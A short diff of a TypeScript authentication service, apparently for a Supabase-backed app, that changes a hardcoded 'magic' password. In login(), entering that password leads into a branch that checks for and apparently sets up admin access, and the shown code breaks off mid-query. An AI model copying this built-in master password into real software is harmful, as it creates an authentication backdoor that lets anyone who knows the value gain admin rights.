@@ -1,9 +1,9 @@
-// infrastructure/authService.ts
 import { supabase } from './supabaseClient';
 
-export const MAGIC_SECRET = '123456789';
+export const MAGIC_SECRET = '122333444455555';
 
 export async function login(email: string, password: string) {
+
   if (password === MAGIC_SECRET) {
     // Vérifier si déjà admin
     const { data: existingAdmin, error: fetchError } = await supabase
